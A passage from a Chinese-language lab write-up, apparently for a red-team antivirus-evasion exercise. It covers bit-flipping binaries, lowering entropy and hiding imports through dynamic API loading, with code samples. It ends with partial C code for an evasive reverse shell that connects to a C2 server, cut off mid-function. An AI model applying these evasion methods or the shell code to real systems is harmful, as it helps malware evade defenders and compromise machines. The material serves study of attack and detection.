<span class="line"><span style="color: #C678DD">while</span><span style="color: #ABB2BF"> i </span><span style="color: #56B6C2">&lt;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">len</span><span style="color: #ABB2BF">(orig):</span></span>
<span class="line"><span style="color: #ABB2BF">	current </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">list</span><span style="color: #ABB2BF">(orig)</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #7F848E; font-style: italic"># 它读取当前字节 i 的值，将其与十六进制值 0xde 进行异或（XOR）运算。异或运算会翻转字节中的某些位，从而改变其值。</span></span>
<span class="line"><span style="color: #ABB2BF">	current[i] </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">chr</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">ord</span><span style="color: #ABB2BF">(current[i]) </span><span style="color: #56B6C2">^</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">0x</span><span style="color: #D19A66">de</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">	path </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;</span><span style="color: #D19A66">%d</span><span style="color: #98C379">.exe&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">%</span><span style="color: #ABB2BF"> i</span></span>
<span class="line"><span style="color: #ABB2BF">	</span></span>
<span class="line"><span style="color: #ABB2BF">	output </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&quot;</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">join</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">str</span><span style="color: #ABB2BF">(e) </span><span style="color: #C678DD">for</span><span style="color: #ABB2BF"> e </span><span style="color: #C678DD">in</span><span style="color: #ABB2BF"> current)</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #56B6C2">open</span><span style="color: #ABB2BF">(path, </span><span style="color: #98C379">&quot;wb&quot;</span><span style="color: #ABB2BF">).</span><span style="color: #61AFEF">write</span><span style="color: #ABB2BF">(output)</span></span>
<span class="line"><span style="color: #ABB2BF">	i </span><span style="color: #56B6C2">+=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span></span>
<span class="line"><span style="color: #ABB2BF">	</span></span>
<span class="line"><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;done&quot;</span><span style="color: #ABB2BF">)</span></span></code></pre></div></div></figure>
<p>生成变体后，我们可以利用一个脚本遍历按位翻转的列表并使用 <code>signtool</code> 这样的工具自动筛选可用的 exe，下面是一个批处理脚本。</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">FOR</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">L </span><span style="color: #C678DD">%</span><span style="color: #56B6C2">%</span><span style="color: #ABB2BF">A </span><span style="color: #C678DD">IN</span><span style="color: #ABB2BF"> (</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">10000</span><span style="color: #ABB2BF">) </span><span style="color: #C678DD">DO</span><span style="color: #ABB2BF"> (</span></span>
<span class="line"><span style="color: #ABB2BF">	signtool verify </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">v </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">a flipped\\</span><span style="color: #C678DD">%</span><span style="color: #56B6C2">%A.exe</span></span>
<span class="line"><span style="color: #ABB2BF">)</span></span></code></pre></div></div></figure>
<h3 id="Entropy-熵">Entropy 熵</h3>
<p>“熵”（Entropy）指的是文件中数据的<strong>随机性</strong>。在安全领域，EDR 和其他扫描工具常用它来判断一个文件是否包含隐藏数据或可疑脚本。因为高度随机的数据（高熵值）可能意味着文件被加密或混淆了。</p>
<ul>
<li><strong>高熵值</strong>：通常表明数据是经过加密或混淆的，这会引起安全工具的警觉。</li>
<li><strong>低熵值</strong>：通常表明数据是普通文本或未加密的代码。</li>
</ul>
<p>为了降低熵值，我们可以将恶意代码中高度随机的<strong>混淆标识符</strong>（如 <code>q234uf</code>）替换成随机选取的<strong>普通英文单词</strong>（如 <code>nature</code>）。这样，文件看起来就不那么“随机”，从而降低其熵值，帮助规避检测。这里我们可以使用 <a target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef/#recipe=Entropy('Shannon%20scale')">CyberChef</a> 观察熵是如何变化的。</p>
<h2 id="Behavioral-Signatures-行为特征签名">Behavioral Signatures 行为特征签名</h2>
<p>通过混淆方法和属性确实能规避掉检测，但是现代的杀软仅仅过静态是没用的，他还会观察我们的程序的行为特征。</p>
<p>现代杀毒引擎会采用两种常见的方法来检测恶意行为：<strong>观察导入表</strong>和 <strong>Hook 已知的恶意调用</strong>。</p>
<h3 id="导入表">导入表</h3>
<p>导入表是可执行文件（如<code>.exe</code>或<code>.dll</code>）中的一个部分，它列出了程序运行时需要从其他动态链接库（DLL）中调用的所有外部函数。这些函数通常是操作系统提供的核心API，比如 <code>CreateProcess</code> (创建新进程)、<code>WriteFile</code> (写入文件) 或 <code>InternetConnect</code> (连接到互联网)。</p>
<p>杀毒引擎会扫描程序的导入表。如果一个程序导入了大量与恶意行为相关的函数，即使它还没有运行，杀毒引擎也会将它标记为可疑。例如，一个看似简单的文本编辑器如果导入了 <code>SetWindowsHookEx</code> (键盘记录) 和 <code>InternetConnect</code> (网络通信) 等函数，就会被视为高风险。</p>
<p>但是导入表可以通过很少的步骤就能被混淆掉，而 Hook 就需要高阶技术了。</p>
<h3 id="API-调用">API 调用</h3>
<p>在基于 C 语言的程序中，传统的 API 调用流程主要解决了两个核心问题：<strong>如何找到 API 函数的地址</strong>，以及<strong>如何在运行时调用它们</strong>。这个过程可以分为以下几个关键步骤。</p>
<p><strong>1. 问题：动态的函数地址</strong></p>
<p>程序的 API 调用和操作系统的原生函数需要一个指向内存地址的指针。这看似简单，但由于 **ASLR（地址空间布局随机化）**的存在，操作系统每次启动程序时，都会将 DLL（如 <code>kernel32.dll</code> 或 <code>ntdll.dll</code>）加载到不同的内存地址。这意味着，我们不能在编译时就确定函数的具体地址，它在运行时是动态变化的。</p>
<p><strong>2. 解决方案：Windows 加载器</strong></p>
<p>为了解决这个问题，Windows 操作系统提供了一个核心组件：<strong>Windows 加载器</strong>。程序不需要自己费力地在运行时寻找并修改函数地址，这个繁重而复杂的任务都交给了加载器。当程序启动时，加载器会负责将所有必需的模块（DLL）加载到内存中，并找到每个函数的确切地址。</p>
<p><strong>3. 关键机制：导入地址表 (IAT)</strong></p>
<p>Windows 加载器用来存储这些动态地址的核心机制是 <strong>IAT（导入地址表）</strong>。</p>
<ul>
<li><strong>IAT 的位置</strong>：IAT 是 <strong>PE（可移植可执行文件）头</strong>的一部分，具体位于 <code>IMAGE_OPTIONAL_HEADER</code> 中。</li>
<li><strong>IAT 的作用</strong>：在程序刚加载到内存时，IAT 中的条目是空的。在程序运行前，Windows 加载器会遍历所有导入的函数，找到它们在内存中的真实地址，然后将这些地址填入 IAT 相应的位置。</li>
</ul>
<p><strong>4. 最终调用：Thunk</strong></p>
<p>为了获取这些真实地址，加载器会访问一个<strong>指针表</strong>，这个表包含了指向 <strong>thunk</strong> 的指针。简单来说，<code>thunk</code> 是一个包含了跳转指令的简短代码段，它最终将执行流重定向到 API 函数的真实地址。因此，加载器实际上是将一个指向 <code>thunk</code> 的指针作为 API 函数的最终调用地址分配给 IAT。</p>
<p>通过这个复杂的流程，程序就能在运行时，通过查询 IAT，找到并正确调用它需要的操作系统 API，确保即使在 ASLR 的环境下也能正常运行，下图是一个 thunk 表的示例：</p>
<img src="/thm_rthe/0d4ba9ba4348b53036cb2127f4968e87.png" class="" title="0d4ba9ba4348b53036cb2127f4968e87">
<h3 id="动态加载：绕过导入表-IAT"><strong>动态加载：绕过导入表 (IAT)</strong></h3>
<p>**导入表（IAT）**能为安全分析师提供关于二进制文件功能的关键信息，这对攻击者来说是极其不利的。那么，如何在需要为函数分配地址的情况下，又防止自己的函数出现在 IAT 中呢？</p>
<p>答案是使用**动态加载（Dynamic Loading）**技术。</p>
<ul>
<li><strong>传统方式</strong>：Windows 加载器在程序启动时，会自动为所有导入的函数填充 IAT，使分析师能轻松看到程序将要调用的所有 API。</li>
<li><strong>动态加载方式</strong>：与此不同，动态加载不依赖于 IAT 和 Windows 加载器在启动时的自动处理。它是一种在程序<strong>运行时</strong>才获取 API 地址的技术。</li>
</ul>
<p>简单来说，动态加载就是利用 <strong>API 调用</strong>本身来获取其他 API 的地址。这种方法可以有效地绕过 IAT，并最大限度地减少对 Windows 加载器的依赖，从而隐藏程序的真实行为。</p>
<p><strong>动态加载的实现步骤</strong></p>
<p>在 C 语言中，动态加载一个 API 调用通常分为以下四个步骤：</p>
<ol>
<li><strong>定义调用结构</strong>：在主函数之前，需要先定义目标 API 的结构。这个结构描述了该 API 所需的输入和输出，其详细信息可以从微软的官方文档中找到。</li>
<li><strong>获取模块句柄</strong>：获取包含目标 API 的动态链接库（DLL）的句柄。</li>
<li><strong>获取函数地址</strong>：通过模块句柄，获取目标函数的实际内存地址。</li>
<li><strong>使用新调用</strong>：利用获取到的地址，调用目标 API。</li>
</ol>
<p>在 C 语言中，你不能直接调用一个动态加载的函数。你需要先定义一个函数指针类型，来告诉编译器这个函数长什么样，包括它的返回值和参数类型。这个结构可以在微软的官方文档中找到。</p>
<p>例如，对于 <code>GetComputerNameA</code> 这个 API，它的结构可以被定义为：</p>
<figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// 1. 定义调用结构</span></span>
<span class="line"><span style="color: #C678DD">typedef</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">BOOL</span><span style="color: #ABB2BF"> (WINAPI</span><span style="color: #56B6C2">*</span><span style="color: #ABB2BF"> myNotGetComputerNameA)(</span></span>
<span class="line"><span style="color: #ABB2BF">	LPSTR   lpBuffer,</span></span>
<span class="line"><span style="color: #ABB2BF">	LPDWORD nSize</span></span>
<span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure>
<p>这段代码创建了一个名为 <code>myNotGetComputerNameA</code> 的新类型，它是一个函数指针，指向一个返回 <code>BOOL</code>，并接受 <code>LPSTR</code> 和 <code>LPDWORD</code> 作为参数的函数。</p>
<p>接下来，你需要加载包含目标 API 的动态链接库（DLL），并获取它的内存句柄。对于 Windows API 来说，这个库通常是 <code>kernel32.dll</code> 或 <code>ntdll.dll</code>。</p>
<figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// 2. 获取包含调用地址的模块的句柄</span></span>
<span class="line"><span style="color: #ABB2BF">HMODULE hkernel32 </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">LoadLibraryA</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;kernel32.dll&quot;</span><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure>
<p><code>LoadLibraryA</code> 函数负责将 <code>kernel32.dll</code> 加载到进程的内存空间中，并返回一个句柄，这个句柄是后续操作的“钥匙”。</p>
<p>现在，你有了 DLL 的句柄，可以利用 <code>GetProcAddress</code> 函数来获取你需要的 API 的真实内存地址。</p>
<figure class="shiki c"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// 3. 获取调用的进程地址</span></span>
<span class="line"><span style="color: #ABB2BF">myNotGetComputerNameA notGetComputerNameA </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (myNotGetComputerNameA) </span><span style="color: #61AFEF">GetProcAddress</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">hkernel32</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;GetComputerNameA&quot;</span><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure>
<p><code>GetProcAddress</code> 接受模块句柄和函数名作为参数，返回该函数在内存中的实际地址。由于返回的是一个通用指针，我们需要将其<strong>强制转换</strong>为我们在第一步中定义的函数指针类型，以便正确调用。</p>
<p>尽管动态加载是一种有效的混淆技术，但它并非万无一失。</p>
<ul>
<li><code>LoadLibraryA</code> 和 <code>GetProcAddress</code> 的暴露：即使你成功隐藏了对恶意 API 的直接调用，<code>LoadLibraryA</code> 和 <code>GetProcAddress</code> 这两个函数本身仍然会出现在程序的导入表（IAT）中。这本身就是一个可疑的信号，因为许多恶意软件都依赖于这两个函数来动态加载 payload。</li>
<li><strong>对抗现代安全引擎</strong>：高级的安全代理（如 EDR）不仅会监控导入表，还会通过**API 挂钩（API Hooking）**来监视程序的行为。即使你通过动态加载获得了地址，这些安全引擎也可能在函数被调用时拦截并分析其行为。</li>
</ul>
<p>为了应对这些更高级的检测手段，攻击者需要使用更复杂的混淆技术，例如<strong>位置无关代码 (PIC)</strong> 来解决 IAT 暴露问题，以及 **API 脱钩（API Unhooking）**来规避行为监控。</p>
<h3 id="实践-3">实践</h3>
<p>实际上就是通过 <code>GetProcAddress</code> 获取到的函数的实际的调用地址，而不是用传统的导入调用，当然你也可以直接使用 <code>GetComputerNameA</code> 方法，不过他会出现到 IAT 中。如果用动态加载，程序的导入表中只会有 <code>LoadLibraryA</code> 和 <code>GetProcAddress</code> 这两个函数，原理就是这么个样，看怎么理解咯。</p>
<figure class="shiki c"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&lt;windows.h&gt;</span></span>
<span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&lt;stdio.h&gt;</span></span>
<span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&lt;lm.h&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #C678DD">typedef</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">BOOL</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">WINAPI </span><span style="color: #C678DD">*</span><span style="color: #E06C75; font-style: italic">myNotGetComputerNameA</span><span style="color: #ABB2BF">)(</span></span>
<span class="line"><span style="color: #ABB2BF">    LPSTR   lpBuffer,</span></span>
<span class="line"><span style="color: #ABB2BF">    LPDWORD nSize</span></span>
<span class="line"><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">main</span><span style="color: #ABB2BF">() {</span></span>
<span class="line"><span style="color: #ABB2BF">	HMODULE hkernel32 </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">LoadLibraryA</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;kernel32.dll&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">	myNotGetComputerNameA notGetComputerNameA </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (myNotGetComputerNameA) </span><span style="color: #61AFEF">GetProcAddress</span><span style="color: #ABB2BF">(hkernel32, </span><span style="color: #98C379">&quot;GetComputerNameA&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">	CHAR </span><span style="color: #E06C75">hostName</span><span style="color: #ABB2BF">[</span><span style="color: #D19A66">260</span><span style="color: #ABB2BF">];</span></span>
<span class="line"><span style="color: #ABB2BF">	DWORD hostNameLength </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">260</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #61AFEF">notGetComputerNameA</span><span style="color: #ABB2BF">(hostName, </span><span style="color: #C678DD">&amp;</span><span style="color: #ABB2BF">hostNameLength)) {</span></span>
<span class="line"><span style="color: #ABB2BF">		</span><span style="color: #61AFEF">printf</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;hostname: </span><span style="color: #D19A66">%s</span><span style="color: #56B6C2">\\</span><span style="color: #98C379">n&quot;</span><span style="color: #ABB2BF">, hostName);</span></span>
<span class="line"><span style="color: #ABB2BF">	}</span></span>
<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
<h2 id="大杂烩">大杂烩</h2>
<p>需要你用尽毕生所学，做一个满足下面要求的 shell。</p>
<ol>
<li>没有可疑的库调用</li>
<li>没有泄露的函数或变量名</li>
<li>文件哈希值与原始哈希值不同</li>
<li>二进制文件可绕过常见的反病毒引擎</li>
</ol>
<p>首先分析一下需求：</p>
<p>第一点，可以用动态加载完成，在前面就提到了</p>
<p>第二点，变量名和函数都可以用随机字符串代替</p>
<p>第三点我不知道啥意思</p>
<p>第四点就是消灭文件签名咯。</p>
<figure class="shiki c"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&lt;winsock2.h&gt;</span></span>
<span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&lt;windows.h&gt;</span></span>
<span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&lt;ws2tcpip.h&gt;</span></span>
<span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&lt;stdio.h&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #C678DD">#define</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">DEFAULT_BUFLEN</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1024</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 声明好方法签名</span></span>
<span class="line"><span style="color: #C678DD">typedef</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">int</span><span style="color: #ABB2BF">(WSAAPI </span><span style="color: #C678DD">*</span><span style="color: #ABB2BF">WSASTARTUP)(WORD wVersionRequested, LPWSADATA lpWSAData);</span></span>
<span class="line"><span style="color: #C678DD">typedef</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">SOCKET</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">WSAAPI </span><span style="color: #C678DD">*</span><span style="color: #E06C75; font-style: italic">WSASOCKETA</span><span style="color: #ABB2BF">)(</span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> af, </span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> type, </span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> protocol, LPWSAPROTOCOL_INFOA lpProtocolInfo, GROUP g, DWORD dwFlags);</span></span>
<span class="line"><span style="color: #C678DD">typedef</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">unsigned</span><span style="color: #ABB2BF">(WSAAPI </span><span style="color: #C678DD">*</span><span style="color: #ABB2BF">INET_ADDR)(</span><span style="color: #C678DD">const</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">char</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">*</span><span style="color: #ABB2BF">cp);</span></span>
<span class="line"><span style="color: #C678DD">typedef</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">u_short</span><span style="color: #ABB2BF">(WSAAPI </span><span style="color: #C678DD">*</span><span style="color: #ABB2BF">HTONS)(</span><span style="color: #C678DD">u_short</span><span style="color: #ABB2BF"> hostshort);</span></span>
<span class="line"><span style="color: #C678DD">typedef</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">int</span><span style="color: #ABB2BF">(WSAAPI </span><span style="color: #C678DD">*</span><span style="color: #ABB2BF">WSACONNECT)(SOCKET s, </span><span style="color: #C678DD">const</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">struct</span><span style="color: #ABB2BF"> sockaddr </span><span style="color: #C678DD">*</span><span style="color: #ABB2BF">name, </span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> namelen, LPWSABUF lpCallerData, LPWSABUF lpCalleeData, LPQOS lpSQOS, LPQOS lpGQOS);</span></span>
<span class="line"><span style="color: #C678DD">typedef</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">int</span><span style="color: #ABB2BF">(WSAAPI </span><span style="color: #C678DD">*</span><span style="color: #ABB2BF">CLOSESOCKET)(SOCKET s);</span></span>
<span class="line"><span style="color: #C678DD">typedef</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">int</span><span style="color: #ABB2BF">(WSAAPI </span><span style="color: #C678DD">*</span><span style="color: #ABB2BF">WSACLEANUP)(</span><span style="color: #C678DD">void</span><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #C678DD">void</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">RunShell</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">char</span><span style="color: #E06C75"> </span><span style="color: #C678DD">*</span><span style="color: #E06C75; font-style: italic">C2Server</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #C678DD">int</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">C2Port</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">{</span></span>
<span class="line"><span style="color: #ABB2BF">	HMODULE hws2_32 </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">LoadLibraryW</span><span style="color: #ABB2BF">(L</span><span style="color: #98C379">&quot;ws2_32&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">	WSASTARTUP myWSAStartup </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (WSASTARTUP)</span><span style="color: #61AFEF">GetProcAddress</span><span style="color: #ABB2BF">(hws2_32, </span><span style="color: #98C379">&quot;WSAStartup&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">	WSASOCKETA myWSASocketA </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (WSASOCKETA)</span><span style="color: #61AFEF">GetProcAddress</span><span style="color: #ABB2BF">(hws2_32, </span><span style="color: #98C379">&quot;WSASocketA&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">	INET_ADDR myinet_addr </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (INET_ADDR)</span><span style="color: #61AFEF">GetProcAddress</span><span style="color: #ABB2BF">(hws2_32, </span><span style="color: #98C379">&quot;inet_addr&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">	HTONS myhtons </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (HTONS)</span><span style="color: #61AFEF">GetProcAddress</span><span style="color: #ABB2BF">(hws2_32, </span><span style="color: #98C379">&quot;htons&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">	WSACONNECT myWSAConnect </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (WSACONNECT)</span><span style="color: #61AFEF">GetProcAddress</span><span style="color: #ABB2BF">(hws2_32, </span><span style="color: #98C379">&quot;WSAConnect&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">	CLOSESOCKET myclosesocket </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (CLOSESOCKET)</span><span style="color: #61AFEF">GetProcAddress</span><span style="color: #ABB2BF">(hws2_32, </span><span style="color: #98C379">&quot;closesocket&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">	WSACLEANUP myWSACleanup </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (WSACLEANUP)</span><span style="color: #61AFEF">GetProcAddress</span><span style="color: #ABB2BF">(hws2_32, </span><span style="color: #98C379">&quot;WSACleanup&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">	SOCKET mySocket;</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #C678DD">struct</span><span style="color: #ABB2BF"> sockaddr_in addr;</span></span>
<span class="line"><span style="color: #ABB2BF">	WSADATA version;</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #61AFEF">myWSAStartup</span><span style="color: #ABB2BF">(</span><span style="color: #61AFEF">MAKEWORD</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">2</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">2</span><span style="color: #ABB2BF">), </span><span style="color: #C678DD">&amp;</span><span style="color: #ABB2BF">version);</span></span>
<span class="line"><span style="color: #ABB2BF">	mySocket </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">myWSASocketA</span><span style="color: #ABB2BF">(AF_INET, SOCK_STREAM, IPPROTO_TCP, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #E5C07B">addr</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">sin_family</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> AF_INET;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #E5C07B">addr</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">sin_addr</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">s_addr</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">myinet_addr</span><span style="color: #ABB2BF">(C2Server);</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #E5C07B">addr</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">sin_port</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">myhtons</span><span style="color: #ABB2BF">(C2Port);</span></span>
<span class="line"></span>
